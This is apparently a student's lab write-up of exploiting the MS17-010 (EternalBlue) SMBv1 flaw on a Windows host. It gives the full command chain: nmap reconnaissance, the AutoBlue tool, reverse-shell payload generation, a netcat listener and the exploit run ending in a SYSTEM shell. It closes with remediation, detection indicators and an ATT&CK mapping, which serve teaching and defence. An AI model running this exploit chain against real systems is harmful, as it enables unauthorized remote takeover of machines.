# ðŸš© Week 2 Red Ops: MS17-010 Exploitation (EternalBlue)

**Date:** February 10, 2026
**Target:** Windows Victim (`192.168.x.x`)
**Vulnerability:** CVE-2017-0143 (MS17-010)
**Tool Suite:** [3ndG4me/AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
**Outcome:** âœ… Root Compromise (`nt authority\system`)

---

## 1. Executive Summary
During the Week 2 internal engagement, I successfully identified and exploited a critical vulnerability in the SMBv1 protocol of the target Windows host. Using the "EternalBlue" exploit chain, I was able to execute arbitrary code remotely, resulting in a Reverse Shell with **SYSTEM** level privileges.

## 2. Reconnaissance & Discovery
The engagement began with service enumeration to identify potential attack vectors.

### 2.1 Port Scanning:
Verified that SMB (Port 445) was open and fingerprinted the OS.
```bash
sudo nmap -sV -p 445 -O 192.168.x.x
```
### 2.2 Vulnerability Validation:**

Leveraged the Nmap Scripting Engine (NSE) to confirm the vulnerability before exploitation.

```bash
# Locate SMB-related NSE scripts
ls -al /usr/share/nmap/scripts | grep smb-

# Run MS17-010 vulnerability check
sudo nmap -sV -p 445 -O --script=smb-vuln-ms17-010 192.168.x.x
```

**Result:** Host confirmed **VULNERABLE** to MS17-010.

---

## 3. Weaponization (AutoBlue)

Metasploit modules were restricted for this exercise to demonstrate manual exploitation skills. The **AutoBlue-MS17-010** framework was used to generate custom shellcode.

### 3.1 Preparation

Cloned the repository and installed dependencies.

```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010
pip install -r requirements.txt
```
### 3.2 Payload Generation

Compiled a stageless reverse shell payload using `shell_prep.sh`.

```bash
chmod +x shell_prep.sh
./shell_prep.sh
```

**Payload Parameters:**

- **LHOST:** Kali Linux IP  
- **LPORT:** `1234`  
- **Type:** Stageless CMD Shell (x64)  
- **Output:** `shellcode/sc_x64.bin`

---

## 4. Execution & Exploitation

### 4.1 Listener Setup (Attacker)

```bash
nc -nvlp 1234
```

### 4.2 Launching the Exploit

Executed the EternalBlue exploit targeting a compatible Windows SMBv1 kernel.

```bash
chmod +x eternalblue_exploit7.py
python eternalblue_exploit7.py 192.168.x.x shellcode/sc_x64.bin
```
## 5. Post-Exploitation

The exploit successfully triggered a kernel non-paged pool buffer overflow, executing the injected shellcode.

### Proof of Compromise

```cmd
C:\Windows\system32> whoami
nt authority\system
```
## 6. Remediation (Blue Team Note)

To prevent this attack, the organization must:

- **Patch:** Apply Microsoft Security Bulletin **MS17-010** immediately  
- **Disable SMBv1:** Disable the legacy SMBv1 protocol via Group Policy or registry changes

### ðŸ”µ Blue Team Detection Notes

To detect or identify exploitation attempts related to MS17-010 (EternalBlue), defenders should monitor for the following indicators:

- **Network Indicators**
  - Suspicious SMB traffic on **TCP port 445**
  - Malformed SMB packets or unusually large SMB requests
  - Repeated SMB connection attempts followed by abrupt resets

- **Host-Based Indicators**
  - Unexpected creation of network connections from `lsass.exe`, `services.exe`, or other system processes
  - Sudden SYSTEM-level shells or processes spawned without a parent user context
  - Kernel crash logs or instability related to SMB drivers (`srv.sys`)

- **Log Sources to Monitor**
  - Windows Event Logs (System & Security)
  - SMB operational logs
  - EDR alerts for memory corruption or kernel exploitation
  - IDS/IPS signatures for **ETERNALBLUE / MS17-010**

- **Preventive Controls**
  - Enable SMB logging and auditing
  - Deploy IDS rules for known EternalBlue exploit patterns
  - Ensure EDR solutions monitor kernel-level exploitation attempts

### ðŸ§­ MITRE ATT&CK Mapping

The following MITRE ATT&CK techniques were observed or implied during this exploitation chain:

- **T1190 â€“ Exploit Public-Facing Application**  
  - Exploitation of the SMBv1 service over TCP/445 using MS17-010 (EternalBlue).

- **T1210 â€“ Exploitation of Remote Services**  
  - Remote code execution achieved via a vulnerable SMB service without authentication.

- **T1068 â€“ Exploitation for Privilege Escalation**  
  - Kernel-level exploitation resulting in SYSTEM privileges (`nt authority\system`).

- **T1059.003 â€“ Command and Scripting Interpreter: Windows Command Shell**  
  - Execution of a CMD-based reverse shell payload post-exploitation.

- **T1105 â€“ Ingress Tool Transfer**  
  - Delivery and execution of custom shellcode on the target system.

- **TA0004 â€“ Privilege Escalation (Tactic)**  
  - Full compromise of the host achieved through kernel exploitation.

- **TA0008 â€“ Lateral Movement (Potential)**  
  - A SYSTEM-level shell enables credential harvesting and pivoting to additional hosts via SMB.